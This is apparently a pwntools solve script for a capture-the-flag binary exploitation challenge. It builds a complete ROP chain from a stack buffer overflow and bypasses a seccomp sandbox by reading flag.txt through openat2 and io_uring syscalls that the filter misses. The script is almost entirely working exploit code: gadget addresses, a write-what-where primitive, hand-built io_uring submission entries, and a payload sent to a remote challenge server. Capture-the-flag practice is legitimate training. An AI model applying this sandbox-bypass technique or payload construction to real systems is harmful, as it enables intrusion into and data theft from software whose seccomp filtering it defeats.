#!/usr/bin/env python3
"""
Solve for elite_ball_knowledge.

main() has `fgets(buf[16], 0x676700, stdin)` BEFORE setup_sandbox() applies
a seccomp filter that returns EPERM for syscalls 0..335 except 60 (exit) and
231 (exit_group). Everything >=336 is allowed - including io_uring_setup (425),
io_uring_enter (426), and openat2 (437).

Plan:
  1. Stack BoF gives us a ROP chain after main's `ret`.
  2. ROP writes a path string, io_uring_params, and SQEs into .bss using
     `pop rax; pop rdx; pop rbx; mov [rdx], rax; ret` write-what-where.
  3. openat2(AT_FDCWD, "flag.txt", &how, 24)   - returns file fd 3.
  4. io_uring_setup(8, &params) with IORING_SETUP_NO_MMAP - returns uring fd 4.
     We can't use mmap (blocked), so io_uring uses our pre-allocated .bss pages.
  5. Build two chained SQEs (READ from fd 3, WRITE to stdout) at sqe_buf.
     SQE0 uses IOSQE_IO_HARDLINK so the WRITE still fires on a short READ.
  6. Update SQ array + tail in our ring memory.
  7. io_uring_enter(uring_fd, 2, 2, IORING_ENTER_GETEVENTS, NULL, 0) - kernel
     services READ+WRITE; flag content lands on stdout fd 1.
  8. exit_group(0).
"""

from pwn import *

context.binary = elf = ELF("./elite_ball_knowledge")
context.log_level = "info"

# ---------------------------------------------------------------------------
# Gadgets (all from the statically-linked binary, found via capstone search).
# ---------------------------------------------------------------------------
POP_RDI                = 0x403873  # pop rdi ; ret
POP_RSI                = 0x4023e8  # pop rsi ; ret
POP_RDX_RBX            = 0x48d1cb  # pop rdx ; pop rbx ; ret
POP_RCX                = 0x495786  # pop rcx ; add eax, 0x1754000 ; ret  (rcx clean)
POP_RAX                = 0x425d4c  # pop rax ; ret
MOV_PRDX_RAX           = 0x421748  # mov [rdx], rax ; ret
SYSCALL_WRAPPER        = 0x457180  # libc syscall(num, a0..a5)
XOR_R8_R8_MOV_RAX_R8_2POPS = 0x4184b4  # xor r8d, r8d ; mov rax, r8 ; pop rbx ; pop rbp ; ret
MOV_R8D_1              = 0x407b94  # mov r8d, 1 ; mov eax, r8d ; ret
ADD_R8D_EDI            = 0x446ec8  # add r8d, edi ; vzeroupper ; ret
MOV_R9_RAX_3POPS       = 0x472313  # mov r9, rax ; pop r12 ; pop r13 ; mov rax, r9 ; pop r14 ; ret

# ---------------------------------------------------------------------------
# .bss layout. The binary is non-PIE so these are fixed addresses.
# ---------------------------------------------------------------------------
RING_BUF  = 0x4e4000   # io_uring SQ+CQ ring (page-aligned, must be in writable region)
SQE_BUF   = 0x4e5000   # io_uring SQE array (page-aligned)
PARAMS    = 0x4e6000   # struct io_uring_params (120 bytes)
PATH_ADDR = 0x4e6100   # "flag.txt\0"
HOW_ADDR  = 0x4e6200   # struct open_how (24 bytes, all zero == O_RDONLY)
READ_BUF  = 0x4e7000   # destination for the file contents / source for write

# Kernel offsets within ring memory for this io_uring layout (kernel 6.x, no
# SQPOLL, no IORING_SETUP_CQE32, 8 entries -> 16 CQEs). Verified empirically.
SQ_HEAD       = 0
SQ_TAIL       = 4
CQ_HEAD       = 8
CQ_TAIL       = 12
SQ_ARRAY_OFF  = 320

# Predicted file descriptors. The binary opens no files between fgets and our
# ROP, so the first openat2 returns 3 and io_uring_setup returns 4.
FILE_FD  = 3
URING_FD = 4

IORING_SETUP_NO_MMAP   = 1 << 14
IORING_ENTER_GETEVENTS = 1
IOSQE_IO_HARDLINK      = 1 << 3
IORING_OP_READ         = 22
IORING_OP_WRITE        = 23
AT_FDCWD               = -100 & ((1 << 64) - 1)

NR_io_uring_setup = 425
NR_io_uring_enter = 426
NR_openat2        = 437
NR_exit_group     = 231

# ---------------------------------------------------------------------------
# ROP building blocks
# ---------------------------------------------------------------------------
def write_qword(addr, value):
    """Emit gadgets that store qword `value` at `addr` (clobbers rax, rdx, rbx)."""
    return flat(
        POP_RAX, value,
        POP_RDX_RBX, addr, 0,
        MOV_PRDX_RAX,
    )

def set_r9_zero():
    """r9 = 0 (also zeroes r8/rax and pops 2+3 stack slots)."""
    return flat(
        XOR_R8_R8_MOV_RAX_R8_2POPS, 0, 0,   # pop rbx, rbp
        MOV_R9_RAX_3POPS,           0, 0, 0,# pop r12, r13, r14
    )

def set_r8(val):
    if val == 0:
        return flat(XOR_R8_R8_MOV_RAX_R8_2POPS, 0, 0)
    if val == 1:
        return flat(MOV_R8D_1)
    # Generic: zero r8, then add edi.
    return flat(
        XOR_R8_R8_MOV_RAX_R8_2POPS, 0, 0,
        POP_RDI, val & 0xffffffff,
        ADD_R8D_EDI,
    )

def call_syscall(num, a0=0, a1=0, a2=0, a3=0, set_r9=False, a5=0):
    """
    Call libc's syscall(num, a0..a5) wrapper.

    The wrapper at 0x457180 expects:
        rdi=num, rsi=a0, rdx=a1, rcx=a2, r8=a3, r9=a4, [rsp+8]=a5.
    Inside the wrapper, r9 is overwritten from [rsp+8], so a4 cannot be passed
    via this wrapper; we only set r9 ahead of time when we need it left as
    zero for the syscall's a4. After the wrapper rets, our `pop rdi` consumes
    the a5 slot from the stack as a throwaway value.
    """
    chain = b""
    if set_r9:
        chain += set_r9_zero()
    chain += set_r8(a3)
    chain += flat(POP_RCX, a2)
    chain += flat(POP_RDX_RBX, a1, 0)
    chain += flat(POP_RSI, a0)
    chain += flat(POP_RDI, num)
    chain += flat(SYSCALL_WRAPPER,
                  POP_RDI, a5)          # next gadget consumes a5
    return chain

# ---------------------------------------------------------------------------
# Build SQE qwords.
#
#   struct io_uring_sqe layout (64 bytes):
#     u8 opcode, u8 flags, u16 ioprio, s32 fd,        // 0..7
#     u64 off,                                        // 8..15
#     u64 addr,                                       // 16..23
#     u32 len, u32 op_flags,                          // 24..31
#     u64 user_data,                                  // 32..39
#     ...                                             // 40..63 (zero)
# ---------------------------------------------------------------------------
def sqe_head(opcode, flags, fd):
    return (opcode & 0xff) | ((flags & 0xff) << 8) | ((fd & 0xffffffff) << 32)

# READ SQE: HARDLINK so the chained WRITE still runs on a short read.
SQE0_HEAD = sqe_head(IORING_OP_READ,  IOSQE_IO_HARDLINK, FILE_FD)
SQE1_HEAD = sqe_head(IORING_OP_WRITE, 0,                 1)

# ---------------------------------------------------------------------------
# Build the chain.
# ---------------------------------------------------------------------------
payload = b"A" * 0x18                          # buf[16] + saved rbp

# Phase 1: data setup (path + io_uring_params)
payload += write_qword(PATH_ADDR,        u64(b"flag.txt"))
payload += write_qword(PARAMS + 8,       IORING_SETUP_NO_MMAP)
payload += write_qword(PARAMS + 72,      SQE_BUF)     # sq_off.user_addr
payload += write_qword(PARAMS + 112,     RING_BUF)    # cq_off.user_addr

# Phase 2: openat2(AT_FDCWD, "flag.txt", &how, sizeof(how)=24)
payload += call_syscall(NR_openat2, AT_FDCWD, PATH_ADDR, HOW_ADDR, 24)

# Phase 3: io_uring_setup(8, &params)
payload += call_syscall(NR_io_uring_setup, 8, PARAMS)

# Phase 4: build SQE0 (READ) and SQE1 (WRITE).
payload += write_qword(SQE_BUF +  0, SQE0_HEAD)
payload += write_qword(SQE_BUF + 16, READ_BUF)
payload += write_qword(SQE_BUF + 24, 0x100)            # len=0x100, op_flags=0
payload += write_qword(SQE_BUF + 32, 1)                # user_data=1

payload += write_qword(SQE_BUF + 64 +  0, SQE1_HEAD)
payload += write_qword(SQE_BUF + 64 + 16, READ_BUF)
payload += write_qword(SQE_BUF + 64 + 24, 0x100)
payload += write_qword(SQE_BUF + 64 + 32, 2)

# Phase 5: SQ array {0, 1} at ring + 320, then SQ tail = 2 at ring + 4.
payload += write_qword(RING_BUF + SQ_ARRAY_OFF, (1 << 32) | 0)
payload += write_qword(RING_BUF,                (2 << 32) | 0)

# Phase 6: io_uring_enter(uring_fd, 2, 2, IORING_ENTER_GETEVENTS, NULL, 0).
payload += call_syscall(NR_io_uring_enter,
                        URING_FD, 2, 2,
                        IORING_ENTER_GETEVENTS,
                        set_r9=True, a5=0)

# Phase 7: clean exit so we don't crash on garbage gadgets.
payload += call_syscall(NR_exit_group, 0)

assert b"\n" not in payload, "fgets stops at newline; rework an offending value"
log.info("payload size = %d bytes (fgets cap = 0x676700)", len(payload))

# ---------------------------------------------------------------------------
# Fire.
# ---------------------------------------------------------------------------

log.context_level = 'debug'

if args.REMOTE:
    # io = remote(args.HOST or "localhost", int(args.PORT or 32267))
    io = remote("elijah-balls.chal.zip", 32267)
    # io = remote("localhost", 32267)
else:
    io = process("./elite_ball_knowledge")


io.sendline(payload)
print(io.recvline())

# io.recvuntil(b"grey{", timeout=5)
# print("grey{" + io.recvuntil(b"}").decode(errors="replace"))
io.close()
